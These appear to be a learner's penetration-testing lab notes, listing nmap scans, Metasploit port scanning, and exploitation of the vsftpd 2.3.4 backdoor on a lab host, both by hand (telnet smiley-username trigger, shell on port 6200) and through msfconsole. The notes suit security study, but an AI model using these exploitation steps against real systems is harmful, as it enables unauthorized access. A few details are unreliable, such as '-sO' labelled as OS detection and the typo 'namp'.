Installing first tools : 
```
apt update
apt install net-tools
apt install nmap
ifconfig
apt install -y iputils-ping
apt install metasploit-framework
```
* Testing ping for 2 machines 
```
ping <ip_victim>
```
```
ping <ip_pentester>
```
* Testing nmap roadmap 
```
nmap -F <ip_victim>
```

* Finding host and scanning network 
learning.oreilly.com/library/view/ceh-certified-ethical

1. check for live systems
```
sudo nmap -sP <ip_victim_network>/24
```

2. check for open ports
(port 80, 443 for web)
```
sudo nmap -sT -p 80,443 10.7.1.0/24
```
T : for TCP using 3-way handshake (Full Open scan) </br>
message 1 : i'm prot 443 Are you theire (SYN) </br>
message 2 : yes i'm thiere, (SYN ACK) </br>
message 3 : let's talk (ACK) </br>
More detect by the IDS </br>
3-way handshake without connection 
```
sudo nmap -sS -p 80,443 <ip_victim_network>/24
```

S : Stealthy (half Open Scan)
(2way handshake)
```
sudo nmap -sT <ip_victim>
```
If with wirshark :  </br>
filter by ip.addr eq <ip_victim> </br>
click one converstation and "apply this filter" </br>

4. Perform banner grabbing
OS detection :
```
sudo nmap -sO <ip_victim>
```
Mora options 
```
sudo nmap -A <ip_victim>
```

5. scan vulnerabilities
```
namp --script vuln <ip_victim>
```
* Scanning using msfconsole :
In Kali Terminal :
```
msfconsole
```
```
show payloads 
```
```
use auxiliary/scanner/portscan/tcp
```
```
show options
```
```
set ports 80
```
```
set rhosts <ip_victim>
```
```
run
```
OR
```
exploit
```

* Testing backdoor vsftpd manual
```
nmap -sS -p 6200 192.168.211.129
```
```
telnet  192.168.211.129 21
```
tape
```
user backdoor:)
```
tape
```
pass doesitmatter?
```
retest port in another terminal  (ctrl+shift+T)
```
nmap -sS -p 6200 192.168.211.129
```
Opening backdoor 
```
telnet  192.168.211.129 6200
```
command should be end by ;
```
whoami;
```
```
dir;
```

* Testing backdoor vsftpd : 
```
nmap -sV -p 21 <ip_victim>
```
search the exploit : 
```
msfconsole
```
```
search vsftpd
```
run exploit : 
```
use 1
```
```
set rhosts <ip_victim>
```
```
set rport 21
```
```
exploit
```
